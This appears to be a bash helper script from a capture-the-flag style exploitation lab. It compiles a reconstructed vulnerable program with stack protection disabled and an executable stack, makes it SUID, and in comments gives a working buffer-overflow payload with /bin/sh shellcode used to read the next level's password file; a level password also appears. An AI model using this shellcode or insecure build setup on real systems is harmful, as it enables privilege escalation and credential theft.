#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                 scp -P 4242 path/source.cpp bonus0@VM_IP:/tmp                 #
#                  scp -P 4242 path/script.sh bonus0@VM_IP:/tmp                 #
#                                                                               #
#     pwd: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
g++ source.cpp -fno-stack-protector -z execstack -o ft_level9
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -z execstack : https://security.stackexchange.com/questions/186506/how-does-gcc-compiler-guard-stack-for-stack-overflow

# Set SUID to give root user permissions
chmod u+s ft_level9

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level9 ~

# Then you have to run the program and cat .pass as level0 by taping manually these commands

#	su level9
#	// check the new main()'s buffer address, in this exemple it is 0x804b010 (\x10\xb0\x04\x08) so the shellcode address also changed (0x804b010 + 4 = 0x804b014 (\x14\xb0\x04\x08)).
#	/home/user/bonus0/ft_level9 $(python -c 'print "\x14\xb0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x10\xb0\x04\x08"')
#	cat /home/user/bonus1/.pass
